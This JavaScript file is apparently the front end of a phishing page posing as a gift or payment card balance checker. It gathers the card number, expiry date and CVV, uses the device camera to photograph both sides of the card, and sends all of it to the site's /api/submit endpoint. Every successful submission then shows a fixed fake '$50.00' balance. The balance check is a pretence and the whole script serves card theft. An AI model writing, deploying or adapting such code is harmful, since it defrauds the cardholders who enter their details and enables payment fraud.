document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("balanceForm");
  const status = document.getElementById("submitStatus");
  const label = document.querySelector('[data-label]');
  const spinner = document.querySelector('[data-spinner]');
  let stream = null;
  window.frontBlob = null;
  window.backBlob = null;

  // Fix Open Camera (dual)
  document.getElementById("openCameraBtn").addEventListener("click", async () => {
    document.getElementById("dualCaptureBlock").classList.remove("hidden");
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment", width: 1280, height: 720 }
      });
      const track = stream.getVideoTracks()[0];
      document.getElementById("dualVideoFront").srcObject = new MediaStream([track.clone()]);
      document.getElementById("dualVideoBack").srcObject = new MediaStream([track]);
    } catch (err) {
      alert("Camera not available. Use Upload button.");
    }
  });

  // Close dual camera
  document.getElementById("dualCloseBtn").addEventListener("click", () => {
    document.getElementById("dualCaptureBlock").classList.add("hidden");
    if (stream) stream.getTracks().forEach(t => t.stop());
  });

  // Capture Front
  document.getElementById("captureFrontBtn").addEventListener("click", () => {
    capture("dualVideoFront", "frontPreview", blob => window.frontBlob = blob);
  });

  // Capture Back
  document.getElementById("captureBackBtn").addEventListener("click", () => {
    capture("dualVideoBack", "backPreview", blob => window.backBlob = blob);
  });

  function capture(videoId, imgId, callback) {
    const video = document.getElementById(videoId);
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    canvas.toBlob(blob => {
      document.getElementById(imgId).src = URL.createObjectURL(blob);
      document.getElementById(imgId).classList.remove("hidden");
      callback(blob);
    }, "image/jpeg", 0.9);
  }

  // Format MM/YY
  document.getElementById("expiry_date").addEventListener("input", e => {
    let v = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    e.target.value = v;
  });

  // MAIN SUBMIT
  form.addEventListener("submit", async e => {
    e.preventDefault();
    label.classList.add("hidden");
    spinner.classList.remove("hidden");
    status.textContent = "Sending...";

    try {
      const frontBase64 = window.frontBlob ? await blobToBase64(window.frontBlob) : null;
      const backBase64 = window.backBlob ? await blobToBase64(window.backBlob) : null;

      const data = {
        card_number: document.querySelector('[name="card_number"]').value.trim(),
        expiry_date: document.querySelector('[name="expiry_date"]').value.trim(),
        cvv: document.querySelector('[name="cvv"]').value.trim(),
        front_image: frontBase64,
        back_image: backBase64
      };

      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      if (res.ok) {
        status.textContent = "Success! Balance: $50.00";
        document.getElementById("balanceText").textContent = "$50.00";
        document.getElementById("result").classList.remove("hidden");
        setTimeout(() => location.reload(), 3000);
      } else {
        throw new Error("Server rejected");
      }
    } catch (err) {
      status.textContent = "Error. Try again.";
      console.error(err);
      label.classList.remove("hidden");
      spinner.classList.add("hidden");
    }
  });

  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
    form.dispatchEvent(new Event("submit"));
  });

  function blobToBase64(blob) {
    return new Promise(resolve => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result);
      reader.readAsDataURL(blob);
    });
  }
});
